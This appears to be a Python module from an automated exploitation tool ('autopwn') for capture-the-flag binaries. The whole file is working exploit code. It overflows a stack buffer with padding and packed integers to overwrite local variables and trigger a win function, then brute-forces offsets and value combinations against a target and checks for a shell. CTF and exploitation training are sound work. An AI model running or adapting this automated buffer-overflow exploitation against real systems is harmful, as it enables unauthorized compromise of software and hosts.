"""Rule: overwrite local variables to satisfy a condition that triggers a win function."""
from __future__ import annotations

import struct

from pwn import log

from autopwn.agent.state import ActionResult, AttemptRecord
from autopwn.agent.action_utils import open_target, verify_shell, interactive_or_close, safe_close


def _condition(state) -> bool:
    return bool(state.discovered_facts.get("var_overwrite_win"))


def _action(state) -> ActionResult:
    """Try to overwrite local variables so their value matches the target."""
    ctx = state.ctx
    info = state.discovered_facts["var_overwrite_win"]
    target_sum = info.get("target_sum", 0)
    buf_offset = info.get("buf_offset", 0)
    read_size = info.get("read_size", 0)

    if not target_sum:
        return ActionResult(success=False, terminal=True,
                            record=AttemptRecord(strategy="var_overwrite", diagnosis="no_target"))

    log.info(f"Agent var_overwrite: target={target_sum} ({target_sum:#x}), "
             f"buf={buf_offset:#x}, read_size={read_size:#x}")

    word = ctx.bits // 8
    pack = struct.pack

    # Generate value combinations that sum to target
    combos = [
        (target_sum, 0, 0),
        (0, target_sum, 0),
        (0, 0, target_sum),
        (target_sum // 3, target_sum // 3, target_sum - 2 * (target_sum // 3)),
        (target_sum // 2, target_sum - target_sum // 2, 0),
    ]
    # Common CTF patterns
    if target_sum == 666:
        combos.insert(0, (222, 222, 222))
    if target_sum == 0x29a:  # 666 = 0x29a
        combos.insert(0, (222, 222, 222))

    # My_sword_is_ready pattern: read(0, buf, 0x30) where buf is at rbp-0x30
    # Variables at rbp-0x4, rbp-0x8, rbp-0xc (3 x int32)
    # Buffer at rbp-0x30 → vars start at offset 0x30-0xc=0x24 from buffer start
    # So: pad(0x24) + var3(4) + var2(4) + var1(4)

    # Try different padding sizes based on buf_offset
    if buf_offset > 0:
        # Variables are typically at rbp-0x4, rbp-0x8, rbp-0xc
        # Buffer at rbp-buf_offset
        # Offset from buffer to vars: buf_offset - var_offset
        pad_sizes = []
        for var_start in (0xc, 0x10, 0x14, 0x18, 0x1c, 0x20, 0x24):
            if buf_offset > var_start:
                pad_sizes.append(buf_offset - var_start)
        # Also try read_size - 12 (3 ints at the end)
        if read_size >= 12:
            pad_sizes.append(read_size - 12)
        # Deduplicate and sort
        pad_sizes = sorted(set(pad_sizes))
    else:
        pad_sizes = list(range(0x20, 0x40, 4))

    io = None
    for pad_size in pad_sizes:
        for combo in combos:
            if sum(combo) != target_sum:
                continue
            try:
                io = open_target(ctx)
                try:
                    io.recv(timeout=1)
                except Exception:
                    pass

                # Build payload: padding + var values (little-endian int32)
                payload = b"A" * pad_size
                for val in combo:
                    payload += pack("<I", val & 0xFFFFFFFF)

                # Trim to read_size if known
                if read_size and len(payload) > read_size:
                    continue

                log.debug(f"var_overwrite: pad={pad_size}, vals={combo}")
                io.send(payload)

                if verify_shell(io):
                    log.success(f"Agent var_overwrite: pad={pad_size}, combo={combo}")
                    return ActionResult(
                        success=interactive_or_close(io, True),
                        record=AttemptRecord(strategy="var_overwrite", success=True),
                    )
                safe_close(io)
                io = None
            except Exception:
                if io:
                    safe_close(io)
                    io = None

    return ActionResult(
        success=False, terminal=True,
        record=AttemptRecord(strategy="var_overwrite", diagnosis="no_combo_worked"),
    )


RULES = [
    ("var_overwrite", 75, "overwrite local variables to satisfy win condition",
     _condition, _action),
]
